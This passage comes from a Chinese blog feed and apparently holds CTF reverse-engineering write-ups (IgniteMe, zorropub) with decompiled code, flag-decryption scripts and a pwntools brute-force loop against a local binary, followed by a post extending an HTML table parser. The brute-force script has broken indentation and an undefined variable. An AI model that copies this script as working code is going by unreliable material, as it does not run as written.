class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  *v19 = v13;</span><br><span class="line">  <span class="keyword">return</span> <span class="number">-42</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>解码表：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">7F 7F 7F 7F 7F 7F 7F 7F  7F 7F 7F 7F 7F 7F 7F 7F</span><br><span class="line">7F 7F 7F 7F 7F 7F 7F 7F  7F 7F 7F 7F 7F 7F 7F 7F</span><br><span class="line">7F 7F 7F 7F 7F 7F 7F 7F  7F 7F 7F 3E 7F 7F 7F 3F</span><br><span class="line">34 35 36 37 38 39 3A 3B  3C 3D 7F 7F 7F 40 7F 7F</span><br><span class="line">7F 00 01 02 03 04 05 06  07 08 09 0A 0B 0C 0D 0E</span><br><span class="line">0F 10 11 12 13 14 15 16  17 18 19 7F 7F 7F 7F 7F</span><br><span class="line">7F 1A 1B 1C 1D 1E 1F 20  21 22 23 24 25 26 27 28</span><br><span class="line">29 2A 2B 2C 2D 2E 2F 30  31 32 33 7F 7F 7F 7F 7F</span><br></pre></td></tr></table></figure><p>一开始是当成编码表来看的，所以就以为是换表base64，还是太菜了啊TvT。</p><p>照样解密代码：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"></span><br><span class="line">str = <span class="string">"you_know_how_to_remove_junk_code"</span></span><br><span class="line">temp = <span class="string">""</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> str:</span><br><span class="line">    temp += chr(ord(i) ^ <span class="number">0x25</span>)</span><br><span class="line"></span><br><span class="line">print(base64.b64encode(temp.encode()))</span><br></pre></td></tr></table></figure><p>flag：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">XEpQek5LSlJ6TUpSelFKeldASEpTQHpPUEtOekZKQUA&#x3D;</span><br></pre></td></tr></table></figure><hr><h1>re12 reverse-box</h1><p>这题要用到gdb脚本，想顺便学习整理一下gdb和ida的远程调试，就先不写writeup</p><h1>re13 IgniteMe</h1><p>不知道为啥到现在为止攻防世界的逆向题都这么简单，感觉套路都是一样的，而且考察的点也差不多。</p><p>分析过程就不写了，直接放解密脚本，从脚本也能看出加密过程了。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">byte = [</span><br><span class="line">    <span class="number">0x0D</span>, <span class="number">0x13</span>, <span class="number">0x17</span>, <span class="number">0x11</span>, <span class="number">0x02</span>, <span class="number">0x01</span>, <span class="number">0x20</span>, <span class="number">0x1D</span>,  <span class="number">0x0C</span>, </span><br><span class="line">    <span class="number">0x02</span>, <span class="number">0x19</span>, <span class="number">0x2F</span>, <span class="number">0x17</span>, <span class="number">0x2B</span>, <span class="number">0x24</span>, <span class="number">0x1F</span>,<span class="number">0x1E</span>, <span class="number">0x16</span>, </span><br><span class="line">    <span class="number">0x09</span>, <span class="number">0x0F</span>, <span class="number">0x15</span>, <span class="number">0x27</span>, <span class="number">0x13</span>, <span class="number">0x26</span>,  <span class="number">0x0A</span>, <span class="number">0x2F</span>, <span class="number">0x1E</span>,</span><br><span class="line">    <span class="number">0x1A</span>, <span class="number">0x2D</span>, <span class="number">0x0C</span>, <span class="number">0x22</span>, <span class="number">0x04</span></span><br><span class="line">    ]</span><br><span class="line"></span><br><span class="line">temp = <span class="string">"GONDPHyGjPEKruv&#123;&#123;pj]X@rF"</span></span><br><span class="line">flag = <span class="string">""</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(len(temp)):</span><br><span class="line">    asci = ((ord(temp[i])^byte[i])<span class="number">-72</span>)^<span class="number">0x55</span></span><br><span class="line">    <span class="keyword">if</span> asci &gt;= <span class="number">65</span> <span class="keyword">and</span> asci &lt;= <span class="number">90</span>:</span><br><span class="line">        asci += <span class="number">32</span></span><br><span class="line">    <span class="keyword">elif</span> asci &gt;= <span class="number">97</span> <span class="keyword">and</span> asci &lt;= <span class="number">122</span>:</span><br><span class="line">        asci -= <span class="number">32</span></span><br><span class="line">    flag += chr(asci)</span><br><span class="line">print(flag)</span><br></pre></td></tr></table></figure><hr><h1>re16  handcrafted-pyc</h1><p>这个题涉及到python反序列化的问题</p><hr><h1>re18 zorropub</h1><p>先上代码：</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> __fastcall <span class="title">main</span><span class="params">(__int64 a1, <span class="keyword">char</span> **a2, <span class="keyword">char</span> **a3)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">size_t</span> v3; <span class="comment">// rax</span></span><br><span class="line">  <span class="keyword">int</span> v5; <span class="comment">// [rsp+1Ch] [rbp-104h]</span></span><br><span class="line">  <span class="keyword">int</span> v6; <span class="comment">// [rsp+20h] [rbp-100h]</span></span><br><span class="line">  <span class="keyword">int</span> i; <span class="comment">// [rsp+24h] [rbp-FCh]</span></span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">int</span> seed; <span class="comment">// [rsp+28h] [rbp-F8h]</span></span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">int</span> v9; <span class="comment">// [rsp+2Ch] [rbp-F4h]</span></span><br><span class="line">  <span class="keyword">char</span> v10; <span class="comment">// [rsp+30h] [rbp-F0h]</span></span><br><span class="line">  <span class="keyword">char</span> v11[<span class="number">16</span>]; <span class="comment">// [rsp+90h] [rbp-90h]</span></span><br><span class="line">  <span class="keyword">char</span> v12[<span class="number">32</span>]; <span class="comment">// [rsp+A0h] [rbp-80h]</span></span><br><span class="line">  <span class="keyword">char</span> s; <span class="comment">// [rsp+C0h] [rbp-60h]</span></span><br><span class="line">  <span class="keyword">char</span> s1[<span class="number">40</span>]; <span class="comment">// [rsp+E0h] [rbp-40h]</span></span><br><span class="line">  <span class="keyword">unsigned</span> __int64 v15; <span class="comment">// [rsp+108h] [rbp-18h]</span></span><br><span class="line"></span><br><span class="line">  v15 = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  seed = <span class="number">0</span>;</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">"Welcome to Pub Zorro!!"</span>);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">"Straight to the point. How many drinks you want?"</span>, a2);</span><br><span class="line">  __isoc99_scanf(<span class="string">"%d"</span>, &amp;v5);</span><br><span class="line">  <span class="keyword">if</span> ( v5 &lt;= <span class="number">0</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"You are too drunk!! Get Out!!"</span>);</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">"OK. I need details of all the drinks. Give me %d drink ids:"</span>, (<span class="keyword">unsigned</span> <span class="keyword">int</span>)v5);</span><br><span class="line">  <span class="keyword">for</span> ( i = <span class="number">0</span>; i &lt; v5; ++i )</span><br><span class="line">  &#123;</span><br><span class="line">    __isoc99_scanf(<span class="string">"%d"</span>, &amp;v6);</span><br><span class="line">    <span class="keyword">if</span> ( v6 &lt;= <span class="number">16</span> || v6 &gt; <span class="number">0xFFFF</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="built_in">puts</span>(<span class="string">"Invalid Drink Id."</span>);</span><br><span class="line">      <span class="built_in">printf</span>(<span class="string">"Get Out!!"</span>);</span><br><span class="line">      <span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    seed ^= v6;</span><br><span class="line">  &#125;</span><br><span class="line">  i = seed;</span><br><span class="line">  v9 = <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">while</span> ( i )<span class="comment">// 这里是seed要满足的条件</span></span><br><span class="line">  &#123;</span><br><span class="line">    ++v9;</span><br><span class="line">    i &amp;= i - <span class="number">1</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">if</span> ( v9 != <span class="number">10</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">"Looks like its a dangerous combination of drinks right there."</span>);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">"Get Out, you will get yourself killed"</span>);</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  srand(seed);</span><br><span class="line">  MD5_Init(&amp;v10);</span><br><span class="line">  <span class="keyword">for</span> ( i = <span class="number">0</span>; i &lt;= <span class="number">29</span>; ++i )</span><br><span class="line">  &#123;</span><br><span class="line">    v9 = rand() % <span class="number">1000</span>;                         <span class="comment">// v9 = srand(seed)的随机数  每次循环生成一个随机数，最终对比的应该是第30个</span></span><br><span class="line">    <span class="built_in">sprintf</span>(&amp;s, <span class="string">"%d"</span>, v9);</span><br><span class="line">    v3 = <span class="built_in">strlen</span>(&amp;s);</span><br><span class="line">    MD5_Update(&amp;v10, &amp;s, v3);                   <span class="comment">// 对生成的随机数进行md5加密，加密结果为v10</span></span><br><span class="line">    v12[i] = v9 ^ LOBYTE(dword_6020C0[i]);      <span class="comment">// v12是待加密的随机数与该数组异或后的结果（最终flag）</span></span><br><span class="line">  &#125;</span><br><span class="line">  v12[i] = <span class="number">0</span>;</span><br><span class="line">  MD5_Final(v11, &amp;v10);</span><br><span class="line">  <span class="keyword">for</span> ( i = <span class="number">0</span>; i &lt;= <span class="number">15</span>; ++i )</span><br><span class="line">    <span class="built_in">sprintf</span>(&amp;s1[<span class="number">2</span> * i], <span class="string">"%02x"</span>, (<span class="keyword">unsigned</span> __int8)v11[i]);<span class="comment">// 两位一组，十六进制放入s1</span></span><br><span class="line">  <span class="keyword">if</span> ( <span class="built_in">strcmp</span>(s1, <span class="string">"5eba99aff105c9ff6a1a913e343fec67"</span>) )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">"Try different mix, This mix is too sloppy"</span>);</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> <span class="built_in">printf</span>(<span class="string">"\nYou choose right mix and here is your reward: The flag is nullcon&#123;%s&#125;\n"</span>, v12);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>又是MD5又是随机数的，只能写脚本爆破了。后面比对的部分倒是好实现，只是伪随机数的部分不好弄。</p><p>对于逆向来说，理清思路和逻辑是一方面，但是写代码<code>get flag</code>又是另一个更重要的方面，所以也需要掌握更多快速解题的技巧。</p><p>这里学会了一个新姿势，上代码：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line">time1=time.time()</span><br><span class="line">a=[]</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">16</span>,<span class="number">0xffff</span>):<span class="comment"># 这里是生成符合条件的数组</span></span><br><span class="line">v9=<span class="number">0</span></span><br><span class="line">i=i^<span class="number">0</span></span><br><span class="line">j=i</span><br><span class="line"><span class="keyword">while</span>(i):</span><br><span class="line">v9+=<span class="number">1</span></span><br><span class="line">i&amp;=i<span class="number">-1</span></span><br><span class="line"><span class="keyword">if</span> v9 ==<span class="number">10</span>:</span><br><span class="line">a.append(j)</span><br><span class="line">//数组已经弄好了</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> a:</span><br><span class="line">p=process(<span class="string">"./zorropub"</span>)</span><br><span class="line">p.recv()</span><br><span class="line">p.sendline(<span class="string">'1'</span>)<span class="comment"># 向程序中输入数据</span></span><br><span class="line">p.sendline(str(i))<span class="comment"># emmm，觉得int的也ok</span></span><br><span class="line">result=p.recv()</span><br><span class="line"><span class="keyword">if</span> <span class="string">"null"</span> <span class="keyword">in</span> text:</span><br><span class="line"><span class="keyword">print</span> text</span><br><span class="line">time2=time.time()</span><br><span class="line"><span class="keyword">print</span> <span class="string">"time %fs"</span>%(time2-time1)</span><br><span class="line"><span class="keyword">break</span></span><br><span class="line">p.close()</span><br></pre></td></tr></table></figure><p>这里是用到了<code>pwn</code>这个库，因为后面的自己写代码爆破比较麻烦，而前面符合要求的数组比较好得到。所以这里<code>可</code>以控制输入的参数，然后实现爆破的目的。</p><p>好像是解pwn的库，看来得专门去学一下了~</p>]]></content>
      
      
      <categories>
          
          <category> CTF相关 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CTF </tag>
            
            <tag> Writeup </tag>
            
            <tag> 逆向 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>使用python3解析html网页表格</title>
      <link href="/p/3c330a16.html"/>
      <url>/p/3c330a16.html</url>
      
        <content type="html"><![CDATA[<h1>使用python3解析html网页表格</h1><p>实习实在是太无聊了，看书是看不进去的，跟着老师对着那些宛如ZZ的上古软件点点点那更是不可能，于是想起之前找学弟PY，想解析一下课程表的页面，无果，于是就写着玩玩。虽然弄出来好像也没啥卵用……</p><h2 id="需求"><a class="header-anchor" href="#需求"></a>需求</h2><p>使用python3解析html网页，并输出成json结构树</p><p>参考代码：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https:&#x2F;&#x2F;github.com&#x2F;schmijos&#x2F;html-table-parser-python3</span><br></pre></td></tr></table></figure><p>这里是一个外国小哥哥写的解析代码，测试了一下可以解析，但是只能解析简单表，对于复杂表格他这里没有处理。</p><a id="more"></a><h2 id="问题"><a class="header-anchor" href="#问题"></a>问题</h2><p>先上图：</p><p><img src="http://sz.guiu.xyz/images/2020/02/25/image-20191024132057056.png" alt="image-20191024132057056.png"></p><blockquote><p>原来的程序没有考虑合并单元格的情况，导致复杂表的解析结果错位，</p><p>所以需要在原来的基础上对跨行或跨列的情况进行处理。</p></blockquote><p>那么就在这个基础上写代码吧~（自己造轮子是永远不可能造轮子的）</p><h2 id="code"><a class="header-anchor" href="#code"></a>code</h2><p>由于代码比较短，所以直接贴上来，我的改动都在注释里</p><p><a href="http://parser.py" target="_blank" rel="noopener">parser.py</a></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># -----------------------------------------------------------------------------</span></span><br><span class="line"><span class="comment"># Name:        html_table_parser</span></span><br><span class="line"><span class="comment"># Purpose:     Simple class for parsing an (x)html string to extract tables.</span></span><br><span class="line"><span class="comment">#              Written in python3</span></span><br><span class="line"><span class="comment">#</span></span><br><span class="line"><span class="comment"># Author:      Josua Schmid</span></span><br><span class="line"><span class="comment">#</span></span><br><span class="line"><span class="comment"># Created:     05.03.2014</span></span><br><span class="line"><span class="comment"># Copyright:   (c) Josua Schmid 2014</span></span><br><span class="line"><span class="comment"># Licence:     AGPLv3</span></span><br><span class="line"><span class="comment">#</span></span><br><span class="line"><span class="comment"># ChangeLog:   Add logic to handle rowspan and colSpan      2019.10.24</span></span><br><span class="line"><span class="comment"># Author:      guiu</span></span><br><span class="line"><span class="comment"># -----------------------------------------------------------------------------</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> html.parser <span class="keyword">import</span> HTMLParser</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">HTMLTableParser</span><span class="params">(HTMLParser)</span>:</span></span><br><span class="line">    <span class="string">""" This class serves as a html table parser. It is able to parse multiple</span></span><br><span class="line"><span class="string">    tables which you feed in. You can access the result per .tables field.</span></span><br><span class="line"><span class="string">    """</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span><span class="params">(</span></span></span><br><span class="line"><span class="function"><span class="params">        self,</span></span></span><br><span class="line"><span class="function"><span class="params">        decode_html_entities=False,</span></span></span><br><span class="line"><span class="function"><span class="params">        data_separator=<span class="string">' '</span>,</span></span></span><br><span class="line"><span class="function"><span class="params">    )</span>:</span></span><br><span class="line"></span><br><span class="line">        HTMLParser.__init__(self)</span><br><span class="line"></span><br><span class="line">        self._parse_html_entities = decode_html_entities</span><br><span class="line">        self._data_separator = data_separator</span><br><span class="line"></span><br><span class="line">        self._in_td = <span class="literal">False</span></span><br><span class="line">        self._in_th = <span class="literal">False</span></span><br><span class="line">        self._current_table = []</span><br><span class="line">        self._current_row = []</span><br><span class="line">        self._current_cell = []</span><br><span class="line">        self.tables = []</span><br><span class="line"></span><br><span class="line">        <span class="string">""" 添加两个标志位，处理rowspan和colspan """</span></span><br><span class="line">        self.row_flag = <span class="number">0</span></span><br><span class="line">        self.col_flag = <span class="number">0</span></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">handle_starttag</span><span class="params">(self, tag, attrs)</span>:</span></span><br><span class="line">        <span class="string">""" We need to remember the opening point for the content of interest.</span></span><br><span class="line"><span class="string">        The other tags (&lt;table&gt;, &lt;tr&gt;) are only handled at the closing point.</span></span><br><span class="line"><span class="string">        """</span></span><br><span class="line">        <span class="keyword">if</span> tag == <span class="string">'td'</span>:</span><br><span class="line">            <span class="string">""" 这里判断有没有跨行（或跨列）的情况，并将值添加到标志位</span></span><br><span class="line"><span class="string">            需要注意的是，跨行的时候，这里只处理第一列的情况，因为学籍页面只有第一列有rowspan</span></span><br><span class="line"><span class="string">            其余列稍微复杂一些，就暂时不做</span></span><br><span class="line"><span class="string">            """</span></span><br><span class="line">            <span class="keyword">for</span> i <span class="keyword">in</span> attrs:</span><br><span class="line">                <span class="keyword">if</span>  i[<span class="number">0</span>] == <span class="string">'rowspan'</span> <span class="keyword">and</span> i[<span class="number">1</span>]:</span><br><span class="line">                    self.row_flag = int(i[<span class="number">1</span>])</span><br><span class="line">                <span class="keyword">if</span>  i[<span class="number">0</span>] == <span class="string">'colspan'</span> <span class="keyword">and</span> i[<span class="number">1</span>]:</span><br><span class="line">                    self.col_flag = int(i[<span class="number">1</span>])</span><br><span class="line"></span><br><span class="line">            self._in_td = <span class="literal">True</span></span><br><span class="line">        <span class="keyword">if</span> tag == <span class="string">'th'</span>:</span><br><span class="line">            self._in_th = <span class="literal">True</span></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">handle_data</span><span class="params">(self, data)</span>:</span></span><br><span class="line">        <span class="string">""" This is where we save content to a cell """</span></span><br><span class="line">        <span class="keyword">if</span> self._in_td <span class="keyword">or</span> self._in_th:</span><br><span class="line">            self._current_cell.append(data.strip())</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">handle_charref</span><span class="params">(self, name)</span>:</span></span><br><span class="line">        <span class="string">""" Handle HTML encoded characters """</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> self._parse_html_entities:</span><br><span class="line">            self.handle_data(self.unescape(<span class="string">'&amp;#&#123;&#125;;'</span>.format(name)))</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">handle_endtag</span><span class="params">(self, tag)</span>:</span></span><br><span class="line">        <span class="string">""" Here we exit the tags. If the closing tag is &lt;/tr&gt;, we know that we</span></span><br><span class="line"><span class="string">        can save our currently parsed cells to the current table as a row and</span></span><br><span class="line"><span class="string">        prepare for a new row. If the closing tag is &lt;/table&gt;, we save the</span></span><br><span class="line"><span class="string">        current table and prepare for a new one.</span></span><br><span class="line"><span class="string">        """</span></span><br><span class="line">        <span class="keyword">if</span> tag == <span class="string">'td'</span>:</span><br><span class="line">            self._in_td = <span class="literal">False</span></span><br><span class="line">        <span class="keyword">elif</span> tag == <span class="string">'th'</span>:</span><br><span class="line">            self._in_th = <span class="literal">False</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> tag <span class="keyword">in</span> [<span class="string">'td'</span>, <span class="string">'th'</span>]:</span><br><span class="line">            final_cell = self._data_separator.join(self._current_cell).strip()</span><br><span class="line">            self._current_row.append(final_cell)</span><br><span class="line">        </span><br><span class="line">            <span class="string">""" 跨列的时候，旁边的相应列补上 '-', 表示跨列 """</span></span><br><span class="line">            <span class="keyword">if</span> self.col_flag:</span><br><span class="line">                <span class="keyword">for</span> i <span class="keyword">in</span> range(self.col_flag - <span class="number">1</span>):</span><br><span class="line">                    self._current_row.append(<span class="string">'-'</span>)</span><br><span class="line">                self.col_flag = <span class="number">0</span></span><br><span class="line">            </span><br><span class="line">            self._current_cell = []</span><br><span class="line"></span><br><span class="line">        <span class="keyword">elif</span> tag == <span class="string">'tr'</span>:</span><br><span class="line">            self._current_table.append(self._current_row)</span><br><span class="line">            self._current_row = []</span><br><span class="line"></span><br><span class="line">            <span class="string">""" 首列跨行，所以就在第二行开始初始化一个 '-' """</span></span><br><span class="line">            <span class="keyword">if</span> self.row_flag - <span class="number">1</span> &gt;= <span class="number">1</span>:</span><br><span class="line">                self._current_row = [<span class="string">'-'</span>]</span><br><span class="line">                self.row_flag = self.row_flag - <span class="number">1</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">elif</span> tag == <span class="string">'table'</span>:</span><br><span class="line">            self.tables.append(self._current_table)</span><br><span class="line">            self._current_table = []</span><br></pre></td></tr></table></figure><p>example_of_usage.py:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># -----------------------------------------------------------------------------</span></span><br><span class="line"><span class="comment"># Created:     04.03.2014</span></span><br><span class="line"><span class="comment"># Copyright:   (c) Josua Schmid 2014</span></span><br><span class="line"><span class="comment"># Licence:     AGPLv3</span></span><br><span class="line"><span class="comment">#</span></span><br><span class="line"><span class="comment"># Sample script for parsing HTML tables</span></span><br><span class="line"><span class="comment"># -----------------------------------------------------------------------------</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> urllib.request</span><br><span class="line"><span class="keyword">from</span> pprint <span class="keyword">import</span> pprint</span><br><span class="line"><span class="keyword">from</span> html_table_parser <span class="keyword">import</span> HTMLTableParser</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">url_get_contents</span><span class="params">(url)</span>:</span></span><br><span class="line">    <span class="string">""" Opens a website and read its binary contents (HTTP Response Body) """</span></span><br><span class="line">    req = urllib.request.Request(url=url)</span><br><span class="line">    f = urllib.request.urlopen(req)</span><br><span class="line">    <span class="keyword">return</span> f.read()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">main</span><span class="params">()</span>:</span></span><br><span class="line">    <span class="comment"># url = 'http://guiu.xyz/StuProductionSchedule.html'</span></span><br><span class="line">    <span class="comment"># xhtml = url_get_contents(url).decode('utf-8')</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">with</span> open(<span class="string">'./StuProductionSchedule.html'</span>, encoding=<span class="string">'utf-8'</span>) <span class="keyword">as</span> f:</span><br><span class="line">        xhtml = f.read()</span><br><span class="line"></span><br><span class="line">        p = HTMLTableParser()</span><br><span class="line">        p.feed(xhtml)</span><br><span class="line">        fff = p.tables</span><br><span class="line">        pprint(p.tables)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">    main()</span><br></pre></td></tr></table></figure><p>小哥还给了输出csv的选项：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python3 ./html_table_converter -u http://guiu.xyz/StuProductionSchedule.html -o 